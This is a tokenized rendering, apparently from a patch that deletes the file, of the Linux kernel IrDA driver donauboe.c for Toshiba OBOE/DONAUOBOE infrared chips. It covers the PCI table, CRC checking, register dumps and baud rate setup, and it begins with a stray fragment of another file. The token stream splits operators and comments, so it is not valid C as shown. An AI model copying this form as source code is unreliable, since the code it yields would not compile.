",", "2", "}", ",", "{", "P_UART3_RX", ",", "P_UART3_TX", ",", "0", ",", "3", "}", ",", "}", ";", "@", "@", "-", "1", ",", "1732", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "donauboe", ".", "c", "*", "Version", ":", "2", ".", "17", "*", "Description", ":", "Driver", "for", "the", "Toshiba", "OBOE", "(", "or", "type", "-", "O", "or", "701", ")", "*", "FIR", "Chipset", ",", "also", "supports", "the", "DONAUOBOE", "(", "type", "-", "DO", "*", "or", "d01", ")", "FIR", "chipset", "which", "as", "far", "as", "I", "know", "is", "*", "register", "compatible", ".", "*", "Documentation", ":", "http", ":", "//", "libxg", ".", "free", ".", "fr", "/", "irda", "/", "lib", "-", "irda", ".", "html", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "James", "McKenzie", "<", "james", "@", "fishsoup", ".", "dhs", ".", "org", ">", "*", "Created", "at", ":", "Sat", "May", "8", "12", ":", "35", ":", "27", "1999", "*", "Modified", ":", "Paul", "Bristow", "<", "paul", ".", "bristow", "@", "technologist", ".", "com", ">", "*", "Modified", ":", "Mon", "Nov", "11", "19", ":", "10", ":", "05", "1999", "*", "Modified", ":", "James", "McKenzie", "<", "james", "@", "fishsoup", ".", "dhs", ".", "org", ">", "*", "Modified", ":", "Thu", "Mar", "16", "12", ":", "49", ":", "00", "2000", "(", "Substantial", "rewrite", ")", "*", "Modified", ":", "Sat", "Apr", "29", "00", ":", "23", ":", "03", "2000", "(", "Added", "DONAUOBOE", "support", ")", "*", "Modified", ":", "Wed", "May", "24", "23", ":", "45", ":", "02", "2000", "(", "Fixed", "chipio_t", "structure", ")", "*", "Modified", ":", "2", ".", "13", "Christian", "Gennerat", "<", "christian", ".", "gennerat", "@", "polytechnique", ".", "org", ">", "*", "Modified", ":", "2", ".", "13", "dim", "jan", "07", "21", ":", "57", ":", "39", "2001", "(", "tested", "with", "kernel", "2", ".", "4", "&", "irnet", "/", "ppp", ")", "*", "Modified", ":", "2", ".", "14", "Christian", "Gennerat", "<", "christian", ".", "gennerat", "@", "polytechnique", ".", "org", ">", "*", "Modified", ":", "2", ".", "14", "lun", "fev", "05", "17", ":", "55", ":", "59", "2001", "(", "adapted", "to", "patch", "-", "2", ".", "4", ".", "1", "-", "pre8", "-", "irda1", ")", "*", "Modified", ":", "2", ".", "15", "Martin", "Lucina", "<", "mato", "@", "kotelna", ".", "sk", ">", "*", "Modified", ":", "2", ".", "15", "Fri", "Jun", "21", "20", ":", "40", ":", "59", "2002", "(", "sync", "with", "2", ".", "4", ".", "18", ",", "substantial", "fixes", ")", "*", "Modified", ":", "2", ".", "16", "Martin", "Lucina", "<", "mato", "@", "kotelna", ".", "sk", ">", "*", "Modified", ":", "2", ".", "16", "Sat", "Jun", "22", "18", ":", "54", ":", "29", "2002", "(", "fix", "freeregion", ",", "default", "to", "verbose", ")", "*", "Modified", ":", "2", ".", "17", "Christian", "Gennerat", "<", "christian", ".", "gennerat", "@", "polytechnique", ".", "org", ">", "*", "Modified", ":", "2", ".", "17", "jeu", "sep", "12", "08", ":", "50", ":", "20", "2002", "(", "save_flags", "(", ");", "cli", "(", ");", "replaced", "by", "spinlocks", ")", "*", "Modified", ":", "2", ".", "18", "Christian", "Gennerat", "<", "christian", ".", "gennerat", "@", "polytechnique", ".", "org", ">", "*", "Modified", ":", "2", ".", "18", "ven", "jan", "10", "03", ":", "14", ":", "16", "2003", "Change", "probe", "default", "options", "*", "*", "Copyright", "(", "c", ")", "1999", "James", "McKenzie", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "James", "McKenzie", "nor", "Cambridge", "University", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "Applicable", "Models", ":", "Libretto", "100", "/", "110CT", "and", "many", "more", ".", "*", "Toshiba", "refers", "to", "this", "chip", "as", "the", "type", "-", "O", "IR", "port", ",", "*", "or", "the", "type", "-", "DO", "IR", "port", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "Look", "at", "toshoboe", ".", "h", "(", "currently", "in", "include", "/", "net", "/", "irda", ")", "for", "details", "of", "*", "/", "/", "*", "Where", "to", "get", "documentation", "on", "the", "chip", "*", "/", "/", "*", "See", "below", "for", "a", "description", "of", "the", "logic", "in", "this", "driver", "*", "/", "/", "*", "User", "servicable", "parts", "*", "/", "/", "*", "USE_PROBE", "Create", "the", "code", "which", "probes", "the", "chip", "and", "does", "a", "few", "tests", "*", "/", "/", "*", "do_probe", "module", "parameter", "Enable", "this", "code", "*", "/", "/", "*", "Probe", "code", "is", "very", "useful", "for", "understanding", "how", "the", "hardware", "works", "*", "/", "/", "*", "Use", "it", "with", "various", "combinations", "of", "TT_LEN", ",", "RX_LEN", "*", "/", "/", "*", "Strongly", "recommended", ",", "disable", "if", "the", "probe", "fails", "on", "your", "machine", "*", "/", "/", "*", "and", "send", "me", "<", "james", "@", "fishsoup", ".", "dhs", ".", "org", ">", "the", "output", "of", "dmesg", "*", "/", "#", "define", "USE_PROBE", "1", "#", "undef", "USE_PROBE", "/", "*", "Trace", "Transmit", "ring", ",", "interrupts", ",", "Receive", "ring", "or", "not", "?", "*", "/", "#", "define", "PROBE_VERBOSE", "1", "/", "*", "Debug", "option", ",", "examine", "sent", "and", "received", "raw", "data", "*", "/", "/", "*", "Irdadump", "is", "better", ",", "but", "does", "not", "see", "all", "packets", ".", "enable", "it", "if", "you", "want", ".", "*", "/", "#", "undef", "DUMP_PACKETS", "/", "*", "MIR", "mode", "has", "not", "been", "tested", ".", "Some", "behaviour", "is", "different", "*", "/", "/", "*", "Seems", "to", "work", "against", "an", "Ericsson", "R520", "for", "me", ".", "-", "Martin", "*", "/", "#", "define", "USE_MIR", "/", "*", "Schedule", "back", "to", "back", "hardware", "transmits", "wherever", "possible", ",", "otherwise", "*", "/", "/", "*", "we", "need", "an", "interrupt", "for", "every", "frame", ",", "unset", "if", "oboe", "works", "for", "a", "bit", "and", "*", "/", "/", "*", "then", "hangs", "*", "/", "#", "define", "OPTIMIZE_TX", "/", "*", "Set", "the", "number", "of", "slots", "in", "the", "rings", "*", "/", "/", "*", "If", "you", "get", "rx", "/", "tx", "fifo", "overflows", "at", "high", "bitrates", ",", "you", "can", "try", "increasing", "*", "/", "/", "*", "these", "*", "/", "#", "define", "RING_SIZE", "(", "OBOE_RING_SIZE_RX8", "|", "OBOE_RING_SIZE_TX8", ")", "#", "define", "TX_SLOTS", "8", "#", "define", "RX_SLOTS", "8", "/", "*", "Less", "user", "servicable", "parts", "below", "here", "*", "/", "/", "*", "Test", ",", "Transmit", "and", "receive", "buffer", "sizes", ",", "adjust", "at", "your", "peril", "*", "/", "/", "*", "remarks", ":", "nfs", "usually", "needs", "1k", "blocks", "*", "/", "/", "*", "remarks", ":", "in", "SIR", "mode", ",", "CRC", "is", "received", ",", "-", ">", "RX_LEN", "=", "TX_LEN", "+", "2", "*", "/", "/", "*", "remarks", ":", "test", "accepts", "large", "blocks", ".", "Standard", "is", "0x80", "*", "/", "/", "*", "When", "TT_LEN", ">", "RX_LEN", "(", "SIR", "mode", ")", "data", "is", "stored", "in", "successive", "slots", ".", "*", "/", "/", "*", "When", "3", "or", "more", "slots", "are", "needed", "for", "each", "test", "packet", ",", "*", "/", "/", "*", "data", "received", "in", "the", "first", "slots", "is", "overwritten", ",", "even", "*", "/", "/", "*", "if", "OBOE_CTL_RX_HW_OWNS", "is", "not", "set", ",", "without", "any", "error", "!", "*", "/", "#", "define", "TT_LEN", "0x80", "#", "define", "TX_LEN", "0xc00", "#", "define", "RX_LEN", "0xc04", "/", "*", "Real", "transmitted", "length", "(", "SIR", "mode", ")", "is", "about", "14", "+", "(", "2", "%", "*", "TX_LEN", ")", "more", "*", "/", "/", "*", "long", "than", "user", "-", "defined", "length", "(", "see", "async_wrap_skb", ")", "and", "is", "less", "then", "4K", "*", "/", "/", "*", "Real", "received", "length", "is", "(", "max", "RX_LEN", ")", "differs", "from", "user", "-", "defined", "*", "/", "/", "*", "length", "only", "b", "the", "CRC", "(", "2", "or", "4", "bytes", ")", "*", "/", "#", "define", "BUF_SAFETY", "0x7a", "#", "define", "RX_BUF_SZ", "(", "RX_LEN", ")", "#", "define", "TX_BUF_SZ", "(", "TX_LEN", "+", "BUF_SAFETY", ")", "/", "*", "Logic", "of", "the", "netdev", "part", "of", "this", "driver", "*", "/", "/", "*", "The", "RX", "ring", "is", "filled", "with", "buffers", ",", "when", "a", "packet", "arrives", "*", "/", "/", "*", "it", "is", "DMA", "'", "d", "into", "the", "buffer", "which", "is", "marked", "used", "and", "RxDone", "called", "*", "/", "/", "*", "RxDone", "forms", "an", "skb", "(", "and", "checks", "the", "CRC", "if", "in", "SIR", "mode", ")", "and", "ships", "*", "/", "/", "*", "the", "packet", "off", "upstairs", "*", "/", "/", "*", "The", "transmitter", "on", "the", "oboe", "chip", "can", "work", "in", "one", "of", "two", "modes", "*", "/", "/", "*", "for", "each", "ring", "-", ">", "tx", "[", "]", "the", "transmitter", "can", "either", "*", "/", "/", "*", "a", ")", "transmit", "the", "packet", ",", "leave", "the", "trasmitter", "enabled", "and", "proceed", "to", "*", "/", "/", "*", "the", "next", "ring", "*", "/", "/", "*", "OR", "*", "/", "/", "*", "b", ")", "transmit", "the", "packet", ",", "switch", "off", "the", "transmitter", "and", "issue", "TxDone", "*", "/", "/", "*", "All", "packets", "are", "entered", "into", "the", "ring", "in", "mode", "b", ")", ",", "if", "the", "ring", "was", "*", "/", "/", "*", "empty", "the", "transmitter", "is", "started", ".", "*", "/", "/", "*", "If", "OPTIMIZE_TX", "is", "defined", "then", "in", "TxDone", "if", "the", "ring", "contains", "*", "/", "/", "*", "more", "than", "one", "packet", ",", "all", "but", "the", "last", "are", "set", "to", "mode", "a", ")", "[", "HOWEVER", "*", "/", "/", "*", "the", "hardware", "may", "not", "notice", "this", ",", "this", "is", "why", "we", "start", "in", "mode", "b", ")", "]", "*", "/", "/", "*", "then", "restart", "the", "transmitter", "*", "/", "/", "*", "If", "OPTIMIZE_TX", "is", "not", "defined", "then", "we", "just", "restart", "the", "transmitter", "*", "/", "/", "*", "if", "the", "ring", "isn", "'", "t", "empty", "*", "/", "/", "*", "Speed", "changes", "are", "delayed", "until", "the", "TxRing", "is", "empty", "*", "/", "/", "*", "mtt", "is", "handled", "by", "generating", "packets", "with", "bad", "CRCs", ",", "before", "the", "data", "*", "/", "/", "*", "TODO", ":", "*", "/", "/", "*", "check", "the", "mtt", "works", "ok", "*", "/", "/", "*", "finish", "the", "watchdog", "*", "/", "/", "*", "No", "user", "servicable", "parts", "below", "here", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "skbuff", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "ioport", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "pci", ".", "h", ">", "#", "include", "<", "linux", "/", "rtnetlink", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "/", "/#", "include", "<", "net", "/", "irda", "/", "irmod", ".", "h", ">", "/", "/#", "include", "<", "net", "/", "irda", "/", "irlap_frame", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "crc", ".", "h", ">", "#", "include", "\"", "donauboe", ".", "h", "\"", "#", "define", "INB", "(", "port", ")", "inb_p", "(", "port", ")", "#", "define", "OUTB", "(", "val", ",", "port", ")", "outb_p", "(", "val", ",", "port", ")", "#", "define", "OUTBP", "(", "val", ",", "port", ")", "outb_p", "(", "val", ",", "port", ")", "#", "define", "PROMPT", "OUTB", "(", "OBOE_PROMPT_BIT", ",", "OBOE_PROMPT", ")", ";", "#", "if", "PROBE_VERBOSE", "#", "define", "PROBE_DEBUG", "(", "args", ".", "..", ")", "(", "printk", "(", "args", ")", ")", "#", "else", "#", "define", "PROBE_DEBUG", "(", "args", ".", "..", ")", ";", "#", "endif", "/", "*", "Set", "the", "DMA", "to", "be", "byte", "at", "a", "time", "*", "/", "#", "define", "CONFIG0H_DMA_OFF", "OBOE_CONFIG0H_RCVANY", "#", "define", "CONFIG0H_DMA_ON_NORX", "CONFIG0H_DMA_OFF", "|", "OBOE_CONFIG0H_ENDMAC", "#", "define", "CONFIG0H_DMA_ON", "CONFIG0H_DMA_ON_NORX", "|", "OBOE_CONFIG0H_ENRX", "static", "const", "struct", "pci_device_id", "toshoboe_pci_tbl", "[", "]", "=", "{", "{", "PCI_VENDOR_ID_TOSHIBA", ",", "PCI_DEVICE_ID_FIR701", ",", "PCI_ANY_ID", ",", "PCI_ANY_ID", ",", "}", ",", "{", "PCI_VENDOR_ID_TOSHIBA", ",", "PCI_DEVICE_ID_FIRD01", ",", "PCI_ANY_ID", ",", "PCI_ANY_ID", ",", "}", ",", "{", "}", "/", "*", "Terminating", "entry", "*", "/", "}", ";", "MODULE_DEVICE_TABLE", "(", "pci", ",", "toshoboe_pci_tbl", ")", ";", "#", "define", "DRIVER_NAME", "\"", "toshoboe", "\"", "static", "char", "*", "driver_name", "=", "DRIVER_NAME", ";", "static", "int", "max_baud", "=", "4000000", ";", "#", "ifdef", "USE_PROBE", "static", "bool", "do_probe", "=", "false", ";", "#", "endif", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "static", "int", "toshoboe_checkfcs", "(", "unsigned", "char", "*", "buf", ",", "int", "len", ")", "{", "int", "i", ";", "union", "{", "__u16", "value", ";", "__u8", "bytes", "[", "2", "]", ";", "}", "fcs", ";", "fcs", ".", "value", "=", "INIT_FCS", ";", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "+", "+", "i", ")", "fcs", ".", "value", "=", "irda_fcs", "(", "fcs", ".", "value", ",", "*", "(", "buf", "+", "+)", ");", "return", "fcs", ".", "value", "=", "=", "GOOD_FCS", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "Generic", "chip", "handling", "code", "*", "/", "#", "ifdef", "DUMP_PACKETS", "static", "unsigned", "char", "dump", "[", "50", "]", ";", "static", "void", "_dumpbufs", "(", "unsigned", "char", "*", "data", ",", "int", "len", ",", "char", "tete", ")", "{", "int", "i", ",", "j", ";", "char", "head", "=", "tete", ";", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "i", "+", "=", "16", ")", "{", "for", "(", "j", "=", "0", ";", "j", "<", "16", "&", "&", "i", "+", "j", "<", "len", ";", "j", "+", "+)", "{", "sprintf", "(", "&", "dump", "[", "3", "*", "j", "]", ",\"", "%", "02x", ".", "\",", "data", "[", "i", "+", "j", "]", ");", "}", "dump", "[", "3", "*", "j", "]", "=", "0", ";", "pr_debug", "(", "\"%", "c", "%", "s", "\\", "n", "\"", ",", "head", ",", "dump", ")", ";", "head", "=", "'+", "';", "}", "}", "#", "endif", "#", "ifdef", "USE_PROBE", "/", "*", "Dump", "the", "registers", "*", "/", "static", "void", "toshoboe_dumpregs", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "__u32", "ringbase", ";", "ringbase", "=", "INB", "(", "OBOE_RING_BASE0", ")", "<", "<", "10", ";", "ringbase", "|", "=", "INB", "(", "OBOE_RING_BASE1", ")", "<", "<", "18", ";", "ringbase", "|", "=", "INB", "(", "OBOE_RING_BASE2", ")", "<", "<", "26", ";", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "Register", "dump", ":", "\\", "n", "\"", ");", "printk", "(", "KERN_ERR", "\"", "Interrupts", ":", "Tx", ":", "%", "d", "Rx", ":", "%", "d", "TxUnder", ":", "%", "d", "RxOver", ":", "%", "d", "Sip", ":", "%", "d", "\\", "n", "\"", ",", "self", "-", ">", "int_tx", ",", "self", "-", ">", "int_rx", ",", "self", "-", ">", "int_txunder", ",", "self", "-", ">", "int_rxover", ",", "self", "-", ">", "int_sip", ")", ";", "printk", "(", "KERN_ERR", "\"", "RX", "%", "02x", "TX", "%", "02x", "RingBase", "%", "08x", "\\", "n", "\"", ",", "INB", "(", "OBOE_RXSLOT", ")", ",", "INB", "(", "OBOE_TXSLOT", ")", ",", "ringbase", ")", ";", "printk", "(", "KERN_ERR", "\"", "RING_SIZE", "%", "02x", "IER", "%", "02x", "ISR", "%", "02x", "\\", "n", "\"", ",", "INB", "(", "OBOE_RING_SIZE", ")", ",", "INB", "(", "OBOE_IER", ")", ",", "INB", "(", "OBOE_ISR", ")", ");", "printk", "(", "KERN_ERR", "\"", "CONFIG1", "%", "02x", "STATUS", "%", "02x", "\\", "n", "\"", ",", "INB", "(", "OBOE_CONFIG1", ")", ",", "INB", "(", "OBOE_STATUS", ")", ");", "printk", "(", "KERN_ERR", "\"", "CONFIG0", "%", "02x", "%", "02x", "ENABLE", "%", "02x", "%", "02x", "\\", "n", "\"", ",", "INB", "(", "OBOE_CONFIG0H", ")", ",", "INB", "(", "OBOE_CONFIG0L", ")", ",", "INB", "(", "OBOE_ENABLEH", ")", ",", "INB", "(", "OBOE_ENABLEL", ")", ");", "printk", "(", "KERN_ERR", "\"", "NEW_PCONFIG", "%", "02x", "%", "02x", "CURR_PCONFIG", "%", "02x", "%", "02x", "\\", "n", "\"", ",", "INB", "(", "OBOE_NEW_PCONFIGH", ")", ",", "INB", "(", "OBOE_NEW_PCONFIGL", ")", ",", "INB", "(", "OBOE_CURR_PCONFIGH", ")", ",", "INB", "(", "OBOE_CURR_PCONFIGL", ")", ");", "printk", "(", "KERN_ERR", "\"", "MAXLEN", "%", "02x", "%", "02x", "RXCOUNT", "%", "02x", "%", "02x", "\\", "n", "\"", ",", "INB", "(", "OBOE_MAXLENH", ")", ",", "INB", "(", "OBOE_MAXLENL", ")", ",", "INB", "(", "OBOE_RXCOUNTL", ")", ",", "INB", "(", "OBOE_RXCOUNTH", ")", ");", "if", "(", "self", "-", ">", "ring", ")", "{", "int", "i", ";", "ringbase", "=", "virt_to_bus", "(", "self", "-", ">", "ring", ")", ";", "printk", "(", "KERN_ERR", "\"", "Ring", "at", "%", "08x", ":", "\\", "n", "\"", ",", "ringbase", ")", ";", "printk", "(", "KERN_ERR", "\"", "RX", ":", "\")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "printk", "(", "\"", "(", "%", "d", ",", "%", "02x", ")", "\",", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "len", ",", "self", "-", ">", "ring", "-", ">", "rx", "[", "i", "]", ".", "control", ")", ";", "printk", "(", "\"\\", "n", "\"", ");", "printk", "(", "KERN_ERR", "\"", "TX", ":", "\")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "printk", "(", "\"", "(", "%", "d", ",", "%", "02x", ")", "\",", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "len", ",", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "control", ")", ";", "printk", "(", "\"\\", "n", "\"", ");", "}", "}", "#", "endif", "/", "*", "Don", "'", "t", "let", "the", "chip", "look", "at", "memory", "*", "/", "static", "void", "toshoboe_disablebm", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "__u8", "command", ";", "pci_read_config_byte", "(", "self", "-", ">", "pdev", ",", "PCI_COMMAND", ",", "&", "command", ")", ";", "command", "&", "=", "~", "PCI_COMMAND_MASTER", ";", "pci_write_config_byte", "(", "self", "-", ">", "pdev", ",", "PCI_COMMAND", ",", "command", ")", ";", "}", "/", "*", "Shutdown", "the", "chip", "and", "point", "the", "taskfile", "reg", "somewhere", "else", "*", "/", "static", "void", "toshoboe_stopchip", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "/", "*", "Disable", "interrupts", "*", "/", "OUTB", "(", "0x0", ",", "OBOE_IER", ")", ";", "/", "*", "Disable", "DMA", ",", "Disable", "Rx", ",", "Disable", "Tx", "*", "/", "OUTB", "(", "CONFIG0H_DMA_OFF", ",", "OBOE_CONFIG0H", ")", ";", "/", "*", "Disable", "SIR", "MIR", "FIR", ",", "Tx", "and", "Rx", "*", "/", "OUTB", "(", "0x00", ",", "OBOE_ENABLEH", ")", ";", "/", "*", "Point", "the", "ring", "somewhere", "safe", "*", "/", "OUTB", "(", "0x3f", ",", "OBOE_RING_BASE2", ")", ";", "OUTB", "(", "0xff", ",", "OBOE_RING_BASE1", ")", ";", "OUTB", "(", "0xff", ",", "OBOE_RING_BASE0", ")", ";", "OUTB", "(", "RX_LEN", ">", ">", "8", ",", "OBOE_MAXLENH", ")", ";", "OUTB", "(", "RX_LEN", "&", "0xff", ",", "OBOE_MAXLENL", ")", ";", "/", "*", "Acknoledge", "any", "pending", "interrupts", "*", "/", "OUTB", "(", "0xff", ",", "OBOE_ISR", ")", ";", "/", "*", "Why", "*", "/", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "/", "*", "switch", "it", "off", "*", "/", "OUTB", "(", "OBOE_CONFIG1_OFF", ",", "OBOE_CONFIG1", ")", ";", "toshoboe_disablebm", "(", "self", ")", ";", "}", "/", "*", "Transmitter", "initialization", "*", "/", "static", "void", "toshoboe_start_DMA", "(", "struct", "toshoboe_cb", "*", "self", ",", "int", "opts", ")", "{", "OUTB", "(", "0x0", ",", "OBOE_ENABLEH", ")", ";", "OUTB", "(", "CONFIG0H_DMA_ON", "|", "opts", ",", "OBOE_CONFIG0H", ")", ";", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "PROMPT", ";", "}", "/", "*", "Set", "the", "baud", "rate", "*", "/", "static", "void", "toshoboe_setbaud", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "__u16", "pconfig", "=", "0", ";", "__u8", "config0l", "=", "0", ";", "pr_debug", "(", "\"%", "s", "(", "%", "d", "/", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "speed", ",", "self", "-", ">", "io", ".", "speed", ")", ";", "switch", "(", "self", "-", ">", "speed", ")", "{", "case", "2400", ":", "case", "4800", ":", "case", "9600", ":", "case", "19200", ":", "case", "38400", ":", "case", "57600", ":", "case", "115200", ":", "#", "ifdef", "USE_MIR", "case", "1152000", ":", "#", "endif", "case", "4000000", ":", "break", ";", "default", ":", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "switch", "to", "unsupported", "baudrate", "%", "d", "\\", "n", "\"", ",", "self", "-", ">", "speed", ")", ";", "return", ";", "}", "switch", "(", "self", "-", ">", "speed", ")", "{", "/", "*", "For", "SIR", "the", "preamble", "is", "done", "by", "adding", "XBOFs", "*", "/", "/", "*", "to", "the", "packet", "*", "/", "/", "*", "set", "to", "filtered", "SIR", "mode", ",", "filter", "looks", "for", "BOF", "and", "EOF", "*", "/", "case", "2400", ":", "pconfig", "|", "=", "47", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "4800", ":", "pconfig", "|", "=", "23", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "9600", ":", "pconfig", "|", "=", "11", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "19200", ":", "pconfig", "|", "=", "5", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "38400", ":", "pconfig", "|", "=", "2", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "57600", ":", "pconfig", "|", "=", "1", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "case", "115200", ":", "pconfig", "|", "=", "0", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "25", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "break", ";", "default", ":", "/", "*", "Set", "to", "packet", "based", "reception", "*", "/", "OUTB", "(", "RX_LEN", ">", ">", "8", ",", "OBOE_MAXLENH", ")", ";", "OUTB", "(", "RX_LEN", "&", "0xff", ",", "OBOE_MAXLENL", ")", ";", "break", ";", "}", "switch", "(", "self", "-", ">", "speed", ")", "{", "case", "2400", ":", "case", "4800", ":", "case", "9600", ":", "case", "19200", ":", "case", "38400", ":", "case", "57600", ":", "case", "115200", ":", "config0l", "=", "OBOE_CONFIG0L_ENSIR", ";", "if", "(", "self", "-", ">", "async", ")", "{", "/", "*", "Set", "to", "character", "based", "reception", "*", "/", "/", "*", "System", "will", "lock", "if", "MAXLEN", "=", "0", "*", "/", "/", "*", "so", "have", "to", "be", "careful", "*", "/", "OUTB", "(", "0x01", ",", "OBOE_MAXLENH", ")", ";", "OUTB", "(", "0x01", ",", "OBOE_MAXLENL", ")", ";", "OUTB", "(", "0x00", ",", "OBOE_MAXLENH", ")", ";", "}", "else", "{", "/", "*", "Set", "to", "packet", "based", "reception", "*", "/", "config0l", "|", "=", "OBOE_CONFIG0L_ENSIRF", ";", "OUTB", "(", "RX_LEN", ">", ">", "8", ",", "OBOE_MAXLENH", ")", ";", "OUTB", "(", "RX_LEN", "&", "0xff", ",", "OBOE_MAXLENL", ")", ";", "}", "break", ";", "#", "ifdef", "USE_MIR", "/", "*", "MIR", "mode", "*", "/", "/", "*", "Set", "for", "16", "bit", "CRC", "and", "enable", "MIR", "*", "/", "/", "*", "Preamble", "now", "handled", "by", "the", "chip", "*", "/", "case", "1152000", ":", "pconfig", "|", "=", "0", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "pconfig", "|", "=", "8", "<", "<", "OBOE_PCONFIG_WIDTHSHIFT", ";", "pconfig", "|", "=", "1", "<", "<", "OBOE_PCONFIG_PREAMBLESHIFT", ";", "config0l", "=", "OBOE_CONFIG0L_CRC16", "|", "OBOE_CONFIG0L_ENMIR", ";", "break", ";", "#", "endif", "/", "*", "FIR", "mode", "*", "/", "/", "*", "Set", "for", "32", "bit", "CRC", "and", "enable", "FIR", "*", "/", "/", "*", "Preamble", "handled", "by", "the", "chip", "*", "/", "case", "4000000", ":", "pconfig", "|", "=", "0", "<", "<", "OBOE_PCONFIG_BAUDSHIFT", ";", "/", "*", "Documentation", "says", "14", ",", "but", "toshiba", "use", "15", "in", "their", "drivers", "*", "/", "pconfig", "|", "=", "15", "<", "<", "OBOE_PCONFIG_PREAMBLESHIFT", ";", "config0l", "=", "OBOE_CONFIG0L_ENFIR", ";", "break", ";", "}", "/", "*", "Copy", "into", "new", "PHY", "config", "buffer", "*", "/", "OUTBP", "(", "pconfig", ">", ">", "8", ",", "OBOE_NEW_PCONFIGH", ")", ";", "OUTB", "(", "pconfig", "&", "0xff", ",", "OBOE_NEW_PCONFIGL", ")", ";", "OUTB", "(", "config0l", ",", "OBOE_CONFIG0L", ")", ";", "/", "*", "Now", "make", "OBOE", "copy", "from", "new", "PHY", "to", "current", "PHY", "*", "/", "OUTB", "(", "0x0", ",", "OBOE_ENABLEH", ")", ";", "OUTB", "(", "OBOE_ENABLEH_PHYANDCLOCK", ",", "OBOE_ENABLEH", ")", ";", "PROMPT", ";", "/", "*", "speed", "change", "executed", "*", "/", "self", "-", ">", "new_speed", "=", "0", ";", "self", "-", ">", "io", ".", "speed", "=", "self", "-", ">", "speed", ";", "}", "/", "*", "Let", "the", "chip", "look", "at", "memory", "*", "/", "static", "void", "toshoboe_enablebm", "(", "struct", "toshoboe_cb", "*", "self", ")", "{", "pci_set_master", "(", "self", "-", ">", "pdev", ")", ";", "}", "/", "*", "setup", "the", "ring", "*", "/", "static", "void", "toshoboe_initring", 